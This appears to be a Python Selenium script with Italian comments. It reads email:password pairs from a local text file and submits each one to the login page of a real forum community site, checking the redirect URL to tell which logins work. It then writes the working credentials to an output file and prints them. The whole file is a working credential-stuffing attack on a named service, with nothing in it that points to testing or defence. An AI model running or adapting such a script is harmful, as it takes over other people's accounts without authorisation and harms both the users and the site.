import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
 
# Dizionario delle credenziali
credentials_file = r"C:\Users\Carlo\Desktop\credentials.txt"
credentials = {}
 
# Leggi le credenziali da un file di testo
with open(credentials_file, 'r') as file:
    for line in file:
        line = line.strip()
        if line:
            email, password = line.split(":")
            credentials[email] = password
 
# Inizializza il driver di Selenium
driver = webdriver.Chrome()
 
# Imposta uno skip per i cookie
try:
    driver.get("https://accounts.forumcommunity.net/?act=Login&cid=88588")
    cookie_accept_button = WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.ID, "cookie-accept")))
    cookie_accept_button.click()
except:
    pass
 
# Variabile di controllo per il ciclo
password_trovata = False
output_file = open("login_riusciti.txt", "w")
 
# Itera sul dizionario di credenziali
for email, password in credentials.items():
    # Se la password è stata trovata, esce dal ciclo
    if password_trovata:
        break
 
    # Compila il form con i dati desiderati
    email_field = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "user-login")))
    password_field = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "pass-login")))
    email_field.clear()
    email_field.send_keys(email)
    password_field.clear()
    password_field.send_keys(password + Keys.RETURN)
 
    # Attendi il caricamento della pagina successiva
    WebDriverWait(driver, 1).until(EC.url_changes(driver.current_url))
 
    # Ottenere l'URL corrente
    current_url = driver.current_url
 
    # Puoi poi gestire la risposta del server come desideri
 
 
    # Verifica se il login è riuscito controllando l'URL corrente
    if "https://fiatsedici.forumcommunity.net/" in current_url:
        # Scrivi le credenziali nel file di output
        output_file.write("Login riuscito con le credenziali:\n")
        output_file.write("Email: " + email + "\n")
        output_file.write("Password: " + password + "\n")
 
        print("Login riuscito con le credenziali:")
        print("Email:", email)
        print("Password:", password)
    #   password_trovata= True   //da usare se vuoi che alla prima password corretta si fermi il programma
 
 
 
 
    # Ritorna alla pagina di login
    driver.get("https://accounts.forumcommunity.net/?act=Login&cid=88588")
 
input("Premi un tasto per terminare il programma...")
 
# Chiudi il browser
driver.quit()
